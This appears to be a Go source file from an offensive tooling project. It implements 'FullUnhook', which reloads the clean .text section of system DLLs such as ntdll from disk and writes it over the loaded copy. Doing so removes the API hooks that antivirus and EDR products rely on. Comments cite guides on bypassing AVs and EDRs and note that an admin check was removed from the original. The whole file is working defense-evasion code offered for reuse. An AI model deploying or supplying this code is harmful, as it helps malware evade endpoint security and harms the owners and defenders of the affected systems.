package Unhook

/*

References:
https://github.com/RedLectroid/APIunhooker
https://www.ired.team/offensive-security/defense-evasion/bypassing-cylance-and-other-avs-edrs-by-unhooking-windows-apis

*/

import (
	"io/ioutil"
	"strings"
	"unsafe"

	"golang.org/x/sys/windows"

	"github.com/Binject/debug/pe"
)

// Load fresh DLL copy in memory
func FullUnhook(dlls_to_unhook []string) error {
	ntdll := windows.NewLazyDLL("ntdll.dll")
	NtProtectVirtualMemory := ntdll.NewProc("NtProtectVirtualMemory")

	for _, dll_to_unhook := range dlls_to_unhook {
		if !strings.HasPrefix(dll_to_unhook, "C:\\") {
			dll_to_unhook = "C:\\Windows\\System32\\" + dll_to_unhook
		}

		f, err := ioutil.ReadFile(dll_to_unhook)
		if err != nil {
			return err
		}

		file, err := pe.Open(dll_to_unhook)
		if err != nil {
			return err
		}

		x := file.Section(".text")
		size := x.Size
		dll_bytes := f[x.Offset:x.Size]

		dll, err := windows.LoadDLL(dll_to_unhook)
		if err != nil {
			return err
		}

		dll_handle := dll.Handle
		dll_base := uintptr(dll_handle)
		dll_offset := uint(dll_base) + uint(x.VirtualAddress)

		regionsize := uintptr(size)
		var oldProtect uintptr

		r1, _, err := NtProtectVirtualMemory.Call(uintptr(0xffffffffffffffff), uintptr(unsafe.Pointer(&dll_offset)), uintptr(unsafe.Pointer(&regionsize)), windows.PAGE_EXECUTE_READWRITE, uintptr(unsafe.Pointer(&oldProtect)))
		if r1 != 0 {
			return err
		}

		for i := 0; i < len(dll_bytes); i++ {
			loc := uintptr(dll_offset + uint(i))
			mem := (*[1]byte)(unsafe.Pointer(loc))
			(*mem)[0] = dll_bytes[i]
		}

		r2, _, err := NtProtectVirtualMemory.Call(uintptr(0xffffffffffffffff), uintptr(unsafe.Pointer(&dll_offset)), uintptr(unsafe.Pointer(&regionsize)), oldProtect, uintptr(unsafe.Pointer(&oldProtect)))
		if r2 != 0 {
			return err
		}
	}

	return nil
}

//This code is from https://github.com/D3Ext/Hooka (i just removed admin check)
